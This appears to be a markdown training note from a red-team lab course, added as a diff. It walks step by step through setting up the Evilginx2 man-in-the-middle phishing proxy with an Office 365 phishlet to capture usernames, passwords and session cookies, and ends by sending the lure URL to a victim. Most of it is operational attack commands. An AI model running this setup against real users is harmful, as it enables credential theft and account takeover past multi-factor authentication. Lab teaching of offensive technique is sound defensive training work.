@@ -1,0 +1,45 @@
+# Initial Access - Phishing - Evilginx2
+
+- We can use Evilginx2 (https://github.com/kgretzky/evilginx2) for phishing attacks.
+
+- Evilginx acts as a relay/man-in-the-middle between the legit web page and the target user. The user always interacts with the legit website and Evilginx captures usernames, passwords and authentication cookies.
+
+- It uses phishlets that are configuration files for specific target domains.
+These are YAML files that specify conditions like hosts, filters, structure
+of authentication cookies and credentials.
+
+#### Starting Evilginx2
+
+- Evilginx2 is already setup on the student VMs. We can use the following commands.
+- Start evilginx2:
+```
+evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets
+```
+- Configure the domain:
+```
+config domain studentx.corp
+```
+- Set the IP for the evilginx server:
+```
+config ip 172.16.x.x
+```
+- Use the template for Office 365:
+```
+phishlets hostname o365 login.studentx.corp
+```
+- Verify the DNS entries:
+```
+phishlets get-hosts o365
+```
+
+
+- Copy the certificate and private key - o365.crt and o365.key from:
+```C:\studentx\.evilginx\crt``` to ```C:\studentx\.evilginx\crt\login.studentx.corp```
+
+- Enable phishlets:
+```phishlets enable o365```
+-  Create the phishing URL (tied to an ID):
+```lures create o365```
+- Get the phishing URL
+```lures get-url <ID>```
+- Share the URL with the victim. (For the lab, send an email using your personal email).
